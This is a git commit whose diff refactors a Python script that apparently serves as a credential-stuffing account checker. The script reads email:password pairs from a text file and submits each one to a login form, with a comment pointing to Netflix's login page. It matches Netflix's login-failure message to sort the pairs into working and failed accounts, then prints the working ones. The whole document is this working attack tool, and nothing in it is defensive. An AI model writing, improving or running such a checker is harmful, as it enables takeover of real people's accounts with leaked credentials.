d59df351a90978d60be6765ad2e313a2990821f0
Aaron Thomas <aaronthomas.handyman@gmail.com>
2014-04-27 19:11:41 -0500

    improved main.py

--- main.py
+++ main.py
@@ -8,43 +8,41 @@ br.set_handle_refresh(False)
 br.addheaders = [('User-agent', 'Firefox')]
 
 def setup():
-	info = raw_input("Enter the file name: ")
-	details = dict()
+	while True:
+		info = raw_input("Enter the file name: ")
+		if(info[len(info)-3:] != 'txt'):
+			print('File name must end in .txt')
+		else:
+			break
 	with open(info) as f:
-		detailsList = f.readlines()
-	for x in range(len(detailsList)):
-		detailsList[x] = detailsList[x].rstrip('\n')
+		detailsList = f.read().splitlines()
 	main(detailsList)
 
 def main(detailsList):
 	site = raw_input("What site do you want to test? ") #https://www.netflix.com/Login
-	good = list()
-	bad = list()
+	good = []
+	bad = []
 	for info in detailsList:
-		username = info.split(':')[0]
-		password = info.split(':')[1]
+		username, password = info.split(':')
 		loginPage = br.open(site)
 		br.form = list(br.forms())[0]
 		br["email"] = username
 		br["password"] = password
 		response = br.submit()
 		if('The login information you entered does not match an account in our records. Remember, your email address is not case-sensitive, but passwords are.' in response.read()):
-			bad.append(username + ":" + password)
+			bad.append(info)
 		else:
-			good.append(username + ":" + password)
+			good.append(info)
 	printDetails(good, bad)
 
 def printDetails(good, bad):
-	print(len(good) + len(bad))
-	print((len(good) / (len(good) + len(bad))) * 100)
-	print('Out of ' + str(len(good) + len(bad)) + ' accounts, ' + str((len(good) / (len(good) + len(bad))) * 100) + '% of them worked! These accounts follow:\n')
+	print('Out of ' + str(len(good) + len(bad)) + ' accounts, ' + str(len(good)) + ' of them worked! These accounts follow:\n')
 	for account in good:
 		print(account)
-	seeBad = raw_input('Do you want to see the bad accounts?\n ')
+	seeBad = raw_input('\nDo you want to see the bad accounts? ')
 	if(seeBad.lower() == 'yes' or seeBad.lower() == 'y'):
 		for account in bad:
 			print(account)
-	else:
-		exit()
 
-setup()
+if __name__ == '__main__':
+	setup()
